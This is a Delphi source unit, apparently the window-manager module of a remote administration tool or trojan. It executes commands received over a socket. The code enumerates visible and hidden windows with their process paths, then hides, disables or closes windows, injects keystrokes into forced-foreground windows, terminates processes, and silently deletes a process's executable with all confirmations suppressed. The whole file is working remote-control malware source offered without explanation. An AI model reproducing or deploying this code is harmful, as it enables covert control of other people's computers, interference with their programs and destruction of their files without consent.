unit UnitWindowManager;

interface

uses
  winsvc,applicationunit,windows,socketunit, unitshareddata, ShlObj,ShFolder,
    ShellAPi, ImageHlp,  messages, Psapi;

threadvar
  WindowListing: string;

procedure ParseData(Socket: TClientSocket; Data: string); forward;

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'WindowManager|' + Data);
end;

function GetClass(Handle: integer): string;
var
  Buf: array[0..255] of char;
begin
  GetClassName(Handle,Buf,255);
  Result := Buf;
end;



function HandleToPid(Handle: integer): integer;
var
  PID: dword;
begin
  GetWindowThreadProcessId(Handle,Pid);
  Result := Pid;
end;

function PidToPath(Pid: integer): string;
var
  ProcessHandle: THandle;
  Buf: array[0..MAX_PATH] of char;
begin
  ProcessHandle := OpenProcess(PROCESS_QUERY_INFORMATION or  PROCESS_VM_READ,   False,Pid);
  GetModuleFileNameEx(ProcessHandle,0,Buf,MAX_PATH);
  Result := String(Buf);
  CloseHandle(ProcessHandle);
end;


function GetWindowAttr(Handle: integer): string;
begin
  if iswindowenabled(Handle) then Result := 'Enabled' else Result := 'Disabled';
  if iswindowvisible(Handle) then Result := Result + ' - Visible' else Result := Result + ' - Hidden';
  if iszoomed(Handle) then Result := Result + ' - Maximized';
  if isiconic(Handle) then Result := Result + ' - Minimized' ;
end;

function GetCaption(Handle: integer): string;
var
  Buf: array[0..255] of char;
begin
  GetWindowText(Handle,Buf,255);
  Result := Buf;
end;

function eWindows(Handle: integer; Num: Integer): bool; stdcall;
var
  IncludeHidden: string;
  IncludeVisible: string;
begin
  IncludeVisible := inttostr(Num);

  IncludeHidden := copy(IncludeVisible,1,1);
  Delete(IncludeVisible,1,1);

  if  IncludeVisible = '1' then if iswindowvisible(Handle) then begin
    WindowListing := WindowListing + inttostr(Handle) + '|' + GetCaption(Handle) + '|' + GetClass(Handle) + '|' + GetWindowAttr(Handle) + '|' + PidToPath(HandleToPid(Handle)) + '|' + inttostr(HandleToPid(Handle)) + #13#10;
  end;

  if  IncludeHidden = '1' then if not iswindowvisible(Handle) then begin
    WindowListing := WindowListing + inttostr(Handle) + '|' + GetCaption(Handle) + '|' + GetClass(Handle) + '|' + GetWindowAttr(Handle) + '|' + PidToPath(HandleToPid(Handle)) + '|' + inttostr(HandleToPid(Handle)) + #13#10;
  end;

  Result := True;
end;

function WindowList(Number: string): string;
begin
  WindowListing := '';
  EnumWindows(@eWindows,strtoint(number));
  Result := WindowListing;
end;

function ChildWindowList(Ownerhandle: string; Number: string): string;
begin
  WindowListing := '';
  EnumChildWindows(strtoint(Ownerhandle),@eWindows,strtoint(Number));
  Result := WindowListing;
end;

function ForceForegroundWindow(wnd: THandle): Boolean;
const 
  SPI_GETFOREGROUNDLOCKTIMEOUT = $2000; 
  SPI_SETFOREGROUNDLOCKTIMEOUT = $2001;
var
  ForegroundThreadID: DWORD;
  ThisThreadID: DWORD;
  timeout: DWORD;
begin
  Result := False;
  if IsIconic(wnd) then ShowWindow(wnd, SW_RESTORE);
  if GetForegroundWindow = wnd then begin
    Result := True;
    Exit;
  end;

  //if ((Win32Platform = VER_PLATFORM_WIN32_NT) and (Win32MajorVersion > 4)) or ((Win32Platform = VER_PLATFORM_WIN32_WINDOWS) and ((Win32MajorVersion > 4) or ((Win32MajorVersion = 4) and (Win32MinorVersion > 0)))) then begin
    ForegroundThreadID := GetWindowThreadProcessID(GetForegroundWindow, nil);
    ThisThreadID := GetWindowThreadPRocessId(wnd, nil);
    if AttachThreadInput(ThisThreadID, ForegroundThreadID, True) then begin
      BringWindowToTop(wnd);
      SetForegroundWindow(wnd);
      AttachThreadInput(ThisThreadID, ForegroundThreadID, False);
      Result := (GetForegroundWindow = wnd);
    end;
    if not Result then begin
      SystemParametersInfo(SPI_GETFOREGROUNDLOCKTIMEOUT, 0, @timeout, 0);
      SystemParametersInfo(SPI_SETFOREGROUNDLOCKTIMEOUT, 0, TObject(0), SPIF_SENDCHANGE);
      BringWindowToTop(wnd); // IE 5.5 related hack
      SetForegroundWindow(Wnd);
      SystemParametersInfo(SPI_SETFOREGROUNDLOCKTIMEOUT, 0, TObject(timeout), SPIF_SENDCHANGE);
    end;
  //end else begin
    //BringWindowToTop(wnd); // IE 5.5 related hack
    //SetForegroundWindow(wnd);
  //end;

  Result := (GetForegroundWindow = wnd);

end;

procedure SimulateKeyDown(Key : byte);
begin
  keybd_event(Key, 0, 0, 0);
end;

procedure SimulateKeyUp(Key : byte);
begin
  keybd_event(Key, 0, KEYEVENTF_KEYUP, 0);
end;

procedure SimulateKeystroke(Key : byte; extra : DWORD);
begin
  keybd_event(Key,extra,0,0);
  keybd_event(Key,extra,KEYEVENTF_KEYUP,0);
end;

procedure SendKeys(s : string);
var
  i : integer;
  flag : bool;
  w : word;
begin
{Get the state of the caps lock key}
  flag := not GetKeyState(VK_CAPITAL) and 1 = 0;
{If the caps lock key is on then turn it off}
  if flag then SimulateKeystroke(VK_CAPITAL, 0);

  for i := 1 to Length(s) do begin
    if s[i] = '~' then begin
      SimulateKeyDown(VK_RETURN);
      continue;
    end else begin
      w := VkKeyScan(s[i]);
      if ((HiByte(w) <> $FF) and (LoByte(w) <> $FF)) then begin
        if HiByte(w) and 1 = 1 then SimulateKeyDown(VK_SHIFT);
        SimulateKeystroke(LoByte(w), 0);
        if HiByte(w) and 1 = 1 then SimulateKeyUp(VK_SHIFT);
      end;
    end;
  end;

  if flag then SimulateKeystroke(VK_CAPITAL, 0);
end;

function KillProc(Pid: integer): string;
var
  Ph: integer;
begin
  Result := 'Error Ending Process: ' + IntToStr(Pid);
  Ph := OpenProcess(PROCESS_TERMINATE,False,PID);
  if TerminateProcess(Ph,0) then Result := 'Successfully Ended Process: ' + IntToStr(Pid);
  CloseHandle(Ph);
end;

function DeleteDirectory(dir: string): string;
var
  fos: TSHFileOpStruct;
begin
  Result := 'Error Deleting File: ' + dir;
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_DELETE;
    fFlags := FOF_SILENT + FOF_NOCONFIRMATION + FOF_NOERRORUI;
    pFrom := PChar(dir + #0);
  end;
  if (0 = ShFileOperation(fos)) then Result := 'Deleted File: ' + dir;
end;


procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'WindowList' then begin
    SendData(socket,Command + '|' + inttostr(GetForeGroundWindow) + '|' + WindowList(Data));
  end;

  if Command = 'ChildWindowList' then begin
    SendData(socket,Command + '|' + inttostr(GetForeGroundWindow) + '|' + ChildWindowList(split(Data,'|',1),split(Data,'|',2)));
  end;

  if Command = 'Hide' then begin
    ShowWindow(StrToInt(Data),SW_HIDE);
  end;

  if Command = 'Show' then begin
    ShowWindow(StrToInt(Data),SW_SHOWNORMAL);
  end;

  if Command = 'Minimize' then begin
    ShowWindow(StrToInt(Data),SW_SHOWMINIMIZED);
  end;

  if Command = 'Maximize' then begin
    ShowWindow(StrToInt(Data),SW_SHOWMAXIMIZED);
  end;

  if Command = 'Flash' then begin
    FlashWindow(StrToInt(Data),True);
  end;

  if Command = 'Restore' then begin
    ShowWindow(StrToInt(Data),SW_RESTORE);
  end;

  if Command = 'Disable' then begin
    EnableWindow(StrToInt(Data),False);
  end;

  if Command = 'Enable' then begin
    EnableWindow(StrToInt(Data),True);
  end;

  if Command = 'Close' then begin
    PostMessage(StrToInt(Data),WM_CLOSE,0,0);
  end;

  if Command = 'Nudge' then begin
    sendmessage(StrToInt(Data),$111,$2B1,0);
  end;

  if Command = 'Activate' then begin
    ForceForegroundWindow(strtoint(Data));
  end;

  if Command = 'ChangeCaption' then begin
    SetWindowText(strtoint(Split(Data,'|',1)),pchar(Split(Data,'|',2)));
  end;

  if Command = 'SendKeys' then begin
    if Split(Data,'|',1) <> 'GetForeGroundWindow' then ForceForegroundWindow(strtoint(Split(Data,'|',1)));//Data := inttostr(GetFOreGroundWindow) + '|' + Split(Data,'|',2);
    SendKeys(Split(Data,'|',2));
  end;

  if Command = 'KeyDown' then begin
    if Split(Data,'|',1) <> 'GetForeGroundWindow' then ForceForegroundWindow(strtoint(Split(Data,'|',1))); //Data := inttostr(GetFOreGroundWindow) + '|' + Split(Data,'|',2);
    keybd_event(strtoint(Split(Data,'|',2)),0,0,0);
  end;

  if Command = 'KeyUp' then begin
    if Split(Data,'|',1) <> 'GetForeGroundWindow' then ForceForegroundWindow(strtoint(Split(Data,'|',1)));//inttostr(GetFOreGroundWindow) + '|' + Split(Data,'|',2);
    keybd_event(strtoint(Split(Data,'|',2)),0,KEYEVENTF_KEYUP,0);
  end;

  if Command = 'EndProcess' then begin
    KillProc(HandleToPid(strtoint(Data)));
  end;

  if Command = 'EndProcessDelete' then begin
    KillProc(HandleToPid(strtoint(Data)));
    DeleteDirectory(PidToPath(HandleToPid(strtoint(Data))));
  end;

end;

end.
